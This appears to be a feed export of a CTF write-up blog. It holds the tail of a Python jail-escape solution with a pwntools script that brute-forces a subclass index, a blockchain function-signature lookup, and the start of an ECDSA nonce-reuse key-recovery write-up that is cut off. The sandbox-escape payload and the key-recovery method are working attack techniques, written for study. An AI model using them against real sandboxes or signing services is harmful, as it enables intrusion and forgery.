class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)])<br></code></pre></td></tr></table></figure><p>That’s it! Now with it working locally, we just need to test it on the server. Remember that the index <code>121</code> for the <code>get_data</code> function I’ve been using may be different on the remote machine, so we need to brute force it. Besides that, the payload is essentially the same. </p><p><strong>Python Solution:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># This function prints the sum of n identical expressions which evaluate to True</span><br><span class="hljs-comment"># The purpose of this is to construct any number (True + True == 2, etc.) without</span><br><span class="hljs-comment"># explicitly using alphanumeric characters</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printTrue</span>(<span class="hljs-params">n</span>):<br>    s = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        s += <span class="hljs-string">&quot;(&#x27;&#x27;==&#x27;&#x27;)+&quot;</span><br>    <span class="hljs-keyword">return</span> s[:-<span class="hljs-number">1</span>]<br><br><span class="hljs-comment"># This spells out &#x27;flag&#x27; (according to the Dockerfile, the flag is stored in &#x27;flag&#x27;)</span><br>code2 = <span class="hljs-string">&quot;()._＿𝖉𝖔𝖈_＿[(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)]+(&#x27;&#x27;!=&#x27;&#x27;)._＿𝖉𝖔𝖈_＿[(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)]+()._＿𝖉𝖔𝖈_＿[(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)]+()._＿𝖉𝖔𝖈_＿[(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)]&quot;</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">400</span>): <span class="hljs-comment"># Brute force the index of the builtins subclass (it is almost certainly different on local than remote)</span><br>    <br>    <span class="hljs-comment"># Connect to server and construct payload</span><br>    r = remote(<span class="hljs-string">&#x27;35.222.133.12&#x27;</span>, <span class="hljs-number">5000</span>)<br>    code1 = <span class="hljs-string">&quot;()._＿𝖈𝖑𝖆𝖘𝖘_＿._＿𝖇𝖆𝖘𝖊𝖘_＿[&#x27;&#x27;==&#x27;𝖈&#x27;]._＿𝖘𝖚𝖇𝖈𝖑𝖆𝖘𝖘𝖊𝖘_＿()[&quot;</span> + printTrue(i) + <span class="hljs-string">&quot;].𝖌𝖊𝖙_𝖉𝖆𝖙𝖆(&#x27;.&#x27;,&quot;</span><br>    code = code1 + code2 + <span class="hljs-string">&#x27;)&#x27;</span><br><br>    <span class="hljs-comment"># Send payload and retrieve the flag</span><br>    r.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>)<br>    r.sendline(code.encode())<br>    line = r.recvline().rstrip().decode()<br><br>    <span class="hljs-comment"># If we found the flag, then print it</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;uoft&#x27;</span> <span class="hljs-keyword">in</span> line:<br>        <span class="hljs-built_in">print</span>(line.rstrip())<br>        r.close()<br>        exit()<br>    r.close()<br></code></pre></td></tr></table></figure><p>Thanks for reading!</p><p><img src="/../images/uoftctf24/leo.gif" alt="gif"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>TCP1PCTF 2023 - [Invitation] - Blockchain</title>
    <link href="/2023/10/15/tcp1p/"/>
    <url>/2023/10/15/tcp1p/</url>
    
    <content type="html"><![CDATA[<h1 id="Invitation"><a href="#Invitation" class="headerlink" title="Invitation"></a>Invitation</h1><p><img src="/../images/tcp1p/init.png" alt="chall"></p><div class="note note-danger">            <p><strong>Difficulty:</strong> <strong>Hard</strong><br><strong>Category:</strong> <strong>Blockchain</strong><br><strong>Flag:</strong> <strong><code>TCP1P{4_Bytes_SigNAtuRe_aS_4n_Invitation_congratz}</code></strong></p>          </div><p>We are given some bytecode in <code>101.txt</code>, and the challenge details in <code>101.txt</code> are as follows:</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Description:<br>    You are provided a bytecode there, yeah?<br>    Find out a way <span class="hljs-keyword">to</span> get a certain <span class="hljs-keyword">function</span> name <span class="hljs-keyword">from</span> <span class="hljs-literal">it</span>,<br>    the correct <span class="hljs-keyword">function</span> name begin <span class="hljs-keyword">with</span> <span class="hljs-string">&quot;TCP1P&quot;</span> string.<br><br>Flag Format<br>    <span class="hljs-keyword">if</span> you manage <span class="hljs-keyword">to</span> find the correct <span class="hljs-keyword">function</span> name<br>    <span class="hljs-keyword">do</span> the exact same thing <span class="hljs-keyword">as</span> the example below<br>    <br>    Found <span class="hljs-built_in">Function</span> name: TCP1P_th1s_1s_4_fl4g_<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">        -&gt;</span> remove the <span class="hljs-string">&quot;()&quot;</span><br>        -&gt; replace the first <span class="hljs-string">&quot;_&quot;</span> <span class="hljs-keyword">with</span> <span class="hljs-string">&quot;&#123;&quot;</span><br>        -&gt; replace the last <span class="hljs-string">&quot;_&quot;</span> <span class="hljs-keyword">with</span> <span class="hljs-string">&quot;&#125;&quot;</span><br>    <br>    Final <span class="hljs-keyword">and</span> Right flag format: TCP1P&#123;th1s_1s_4_fl4g&#125;<br></code></pre></td></tr></table></figure><h3 id="Decompiling-the-Bytecode"><a href="#Decompiling-the-Bytecode" class="headerlink" title="Decompiling the Bytecode"></a>Decompiling the Bytecode</h3><p>First, let us decompile the bytecode. We head over to the <a href="https://library.dedaub.com/decompile">Dedaub decompiler</a> to decompile our bytecode. What we get is a mess, but we do see some strings in the decompiled code that hint towards using <code>Function DB</code>.</p><p><img src="/../images/tcp1p/image4.png" alt="bc"></p><p>Since the decompiled code wasn’t that helpful to us, let’s try another decompiler and hope it gives a better result. After pasting our bytecode into <a href="https://etherscan.io/bytecode-decompiler">Etherscan’s decompiler</a>, we indeed get some decompiled code, but wait a second, what’s this message?</p><p><img src="/../images/tcp1p/Image2.png" alt="decompiling"></p><p>Alright, whatever you say, Etherscan. We remove the construct prefix accordingly, and here’s a part of the decompiled result: </p><p><img src="/../images/tcp1p/Image3.png"></p><p>Huh, that’s interesting. The code is comparing <code>var0</code> to a bunch of 4-byte values, and they somehow correspond to functions (for example, <code>0x3d8a63e4</code> apparently corresponds to <code>scam()</code>). Here, we take a wild guess that these 4-byte values are the function signatures of all the functions available in the contract. </p><p>Indeed, we can verify our guess by calculating the signature of <code>scam()</code> ourselves!</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> Crypto.Hash <span class="hljs-keyword">import</span> keccak<br>k = keccak.new(digest_bits = <span class="hljs-number">256</span>)<br>k.update(<span class="hljs-string">b&#x27;scam()&#x27;</span>)<br><span class="hljs-built_in">print</span>(k.hexdigest()[:<span class="hljs-number">8</span>]) <span class="hljs-comment"># &#x27;3d8a63e4&#x27;, which matches 0x3d8a63e4 !</span><br></code></pre></td></tr></table></figure><h3 id="Function-DB"><a href="#Function-DB" class="headerlink" title="Function DB?"></a>Function DB?</h3><p>Now that we have a bunch of function signatures, we can just brute-force all possible functions until we get the flag, right?<br>No! Brute-forcing is obviously infeasible, so we turn to the next best option - <code>Function DB</code>. </p><p><code>Function DB</code> a.k.a <a href="https://www.4byte.directory/">Ethereum Signature Database</a> is a database that contains over a million function signatures and their corresponding human-readable representation.<br>For example, searching for <code>0x3d8a63e4</code> gives you <code>scam()</code>.</p><p><img src="/../images/tcp1p/Image5.png"></p><p>The next logical step would be to try all the function signatures and hope we find something in <code>Function DB</code>. And indeed we do!</p><p><img src="/../images/tcp1p/Image6.png"></p><p>We found the flag!</p><p><img src="/../images/tcp1p/cleared.png"></p><p>Was a very fun category, me and my team enjoyed this ctf a lot! Till next time.</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NahamconCTF 2023 - [Signed Jeopardy]- Crypto</title>
    <link href="/2023/06/17/nahamctf23/"/>
    <url>/2023/06/17/nahamctf23/</url>
    
    <content type="html"><![CDATA[<h1 id="Signed-Jeopardy"><a href="#Signed-Jeopardy" class="headerlink" title="Signed Jeopardy"></a>Signed Jeopardy</h1><p><img src="/../images/nahamctf23/into.png" alt="challenge"></p><div class="note note-warning">            <p><strong>Difficulty:</strong> <strong>Medium</strong><br><strong>Category:</strong> <strong>Cryptography</strong><br><strong>Flag:</strong> <strong><code>flag{a8168c41537604546394c13c8f4ef4b8}</code></strong></p>          </div><p>This writeup covers the challenge Signed Jeopardy from NahamConCTF 2023, which was probably the hardest crypto challenge in the competition, with only 44 solves. </p><p>In this challenge, we are given a file <code>server.sage</code> which implements the Elliptic Curve Digital Signature Algorithm (ECDSA) on the P521 curve. After generating the public key, the program opens a file called <code>questions.txt</code> and randomly selects questions about video game history and lore. It signs the answer to those questions and prints the question and signed answer to the console. The user can choose to receive questions and signed answers, and can also choose to sign a custom message. If the signature of the user’s message equals the signature calculated by the program, it gives the flag.</p><p><strong>server.sage:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha512<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>flag = f.read()<br><br>questions = []<br>answers = []<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;questions.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> f.readlines():<br>a = x.split(<span class="hljs-string">&#x27;\t&#x27;</span>)<br>questions.append(a[<span class="hljs-number">0</span>])<br>answers.append(a[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># P521 standard curve parameters</span><br>p = <span class="hljs-number">6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151</span><br>a = <span class="hljs-number">6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057148</span><br>b = <span class="hljs-number">1093849038073734274511112390766805569936207598951683748994586394495953116150735016013708737573759623248592132296706313309438452531591012912142327488478985984</span><br>Gx = <span class="hljs-number">2661740802050217063228768716723360960729859168756973147706671368418802944996427808491545080627771902352094241225065558662157113545570916814161637315895999846</span><br>Gy = <span class="hljs-number">3757180025770020463545507224491183603594455134769762486694567779615544477440556316691234405012945539562144444537289428522585666729196580810124344277578376784</span><br>E = EllipticCurve(GF(p), [a, b])<br>G = E(Gx, Gy)<br>n = <span class="hljs-number">6864797660130609714981900799081393217269435300143305409394463459185543183397655394245057746333217197532963996371363321113864768612440380340372808892707005449</span><br>k = randint(<span class="hljs-number">1</span>,n-<span class="hljs-number">1</span>)<br>d = randint(<span class="hljs-number">1</span>,n-<span class="hljs-number">1</span>)<br>Pub = d*G<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>():<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nWhat service would you like?&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\t1. Question&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\t2. Flag&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\t3. Quit&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sign</span>():<br>index = randint(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(questions)-<span class="hljs-number">1</span>)<br>question = questions[index]<br>answer = <span class="hljs-string">&quot;What is &quot;</span>+answers[index].upper()+<span class="hljs-string">&quot;?&quot;</span><br>m_hash = <span class="hljs-built_in">int</span>(sha512(answer.encode()).hexdigest(), <span class="hljs-number">16</span>)<br>P = k*G<br>r = <span class="hljs-built_in">int</span>(P[<span class="hljs-number">0</span>]) % n<br>s = ((m_hash + (r*d))/k)%n<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Here is the question: <span class="hljs-subst">&#123;question&#125;</span>\nAnd here is the signature: (<span class="hljs-subst">&#123;r&#125;</span>, <span class="hljs-subst">&#123;s&#125;</span>)&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>():<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please give the message&quot;</span>)<br>message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> answers:<br><span class="hljs-keyword">if</span> a.casefold() <span class="hljs-keyword">in</span> message.casefold():<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;I can&#x27;t have you using the answer of one of the questions as the message!&quot;</span>)<br>quit()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please give the r value of the signature&quot;</span>)<br>r_given = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&quot;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please give the s value of the signature&quot;</span>)<br>s_given = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&quot;</span>))<br>m_hash = <span class="hljs-built_in">int</span>(sha512(message.encode()).hexdigest(), <span class="hljs-number">16</span>)<br>P = k*G<br>r = <span class="hljs-built_in">int</span>(P[<span class="hljs-number">0</span>]) % n<br>s = ((m_hash + (r*d))/k)%n<br><span class="hljs-keyword">if</span> r == r_given <span class="hljs-keyword">and</span> s == s_given:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;As promised, here&#x27;s your flag --&gt; <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>quit()<br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Not the right signature. HAHAHA!&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Welcome to my ECDSA Jeopardy!\nHere is the public key:\nPublic key = <span class="hljs-subst">&#123;Pub&#125;</span>\nI&#x27;ll sign the answers and give them to you.&quot;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>menu()<br>choice = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&quot;</span>))<br><span class="hljs-keyword">if</span> choice == <span class="hljs-number">1</span>:<br>sign()<br><span class="hljs-keyword">elif</span> choice == <span class="hljs-number">2</span>:<br>get_flag()<br><span class="hljs-keyword">elif</span> choice == <span class="hljs-number">3</span>:<br>quit()<br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid choice. Please try again.&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>main()<br></code></pre></td></tr></table></figure><p>After careful inspection of the code in <code>server.sage</code>, one can observe that the same nonce value <code>k</code> is reused to sign every answer. This is a critical implementation flaw in the ECDSA and the vulnerability which we will exploit in this challenge to retrieve the flag.</p><p>In the ECDSA, a random nonce value <code>k</code> is generated for each signature creation. The nonce value is used in conjunction with the private key to compute a point on the elliptic curve, which is in turn transformed into a valid signature. Since the purpose of the nonce is to provide randomness (uniqueness) to the signature generation process, it is of vital importance that <code>k</code> remains secret and is never reused. If it is reused, the attacker can directly compute <code>k</code> and the private key <code>d</code> and then forge signatures for arbitrary messages. As explained <a href="https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm">here</a>, if we have two messages <code>m1</code> and <code>m2</code> and their signatures <code>(r,s1)</code> and <code>(r,s2)</code>, we can compute the message hashes <code>z1</code> and <code>z2</code> and compute <code>k</code> and <code>d</code> by:</p><p><img src="/../images/nahamctf23/eqn.png" alt="eqn"></p><p>Thus, if we can select two questions from the server to answer - making sure to record the answer signatures - we can recompute <code>k</code> and <code>d</code> using the equations above. Then, we can choose an example message (such as “hello”) and compute its signature using the recovered values. Since we generate the signature using the same <code>k</code> and <code>d</code> used by the server, our signature should match the one computed by the server and we should be able to retrieve the flag!</p><p>First, let’s choose two simple questions to answer:<br><img src="/../images/nahamctf23/intro_msg.PNG" alt="intro_msg"><br><img src="/../images/nahamctf23/question1.PNG" alt="question 1"><br><img src="/../images/nahamctf23/question2.PNG" alt="question 2"></p><p>The answers to these questions are Microsoft and Mythical, respectively. Note that these are our messages <code>m1</code> and <code>m2</code>, and we can compute their hashes to find <code>z1</code> and <code>z2</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> * <span class="hljs-comment"># For elliptic curves</span><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha512 <span class="hljs-comment"># For hasing the message (we actually sign the HASH of the message, not the message itself)</span><br><span class="hljs-keyword">from</span> ecdsa.numbertheory <span class="hljs-keyword">import</span> inverse_mod <span class="hljs-comment"># inverse_mod == division (when moduli are involved)</span><br><br><span class="hljs-comment"># P521 standard curve parameters (from &#x27;server.sage&#x27;)</span><br>p = <span class="hljs-number">6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151</span><br>a = <span class="hljs-number">6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057148</span><br>b = <span class="hljs-number">1093849038073734274511112390766805569936207598951683748994586394495953116150735016013708737573759623248592132296706313309438452531591012912142327488478985984</span><br>Gx = <span class="hljs-number">2661740802050217063228768716723360960729859168756973147706671368418802944996427808491545080627771902352094241225065558662157113545570916814161637315895999846</span><br>Gy = <span class="hljs-number">3757180025770020463545507224491183603594455134769762486694567779615544477440556316691234405012945539562144444537289428522585666729196580810124344277578376784</span><br>E = EllipticCurve(GF(p), [a, b])<br>G = E(Gx, Gy) <br>n = <span class="hljs-number">6864797660130609714981900799081393217269435300143305409394463459185543183397655394245057746333217197532963996371363321113864768612440380340372808892707005449</span><br><br><span class="hljs-comment"># Note: n == the order of G (G == elliptic curve base point) which represents the total</span><br><span class="hljs-comment"># number of different possible points over the curve </span><br><br><span class="hljs-comment"># Question 1: Rare was bought by this company for $3.19 billion.</span><br>m1 = <span class="hljs-string">&quot;What is &quot;</span> + <span class="hljs-string">&quot;Microsoft&quot;</span>.upper() + <span class="hljs-string">&quot;?&quot;</span><br><br><span class="hljs-comment"># Question 2: Category of Pokemon that contain some Pokemon like Victini, Mew, Magearna and Zarude.</span><br>m2 = <span class="hljs-string">&quot;What is &quot;</span> + <span class="hljs-string">&quot;Mythical&quot;</span>.upper() + <span class="hljs-string">&quot;?&quot;</span><br><br><span class="hljs-comment"># Compute the SHA512 hashes of the answers</span><br>z1 = <span class="hljs-built_in">int</span>(sha512(m1.encode()).hexdigest(), <span class="hljs-number">16</span>)<br>z2 = <span class="hljs-built_in">int</span>(sha512(m2.encode()).hexdigest(), <span class="hljs-number">16</span>)<br></code></pre></td></tr></table></figure><p>Now that we have the hashes, we can use the signatures obtained from the server, <code>(r,s1)</code> and <code>(r,s2)</code>, to recover <code>k</code> and <code>d</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 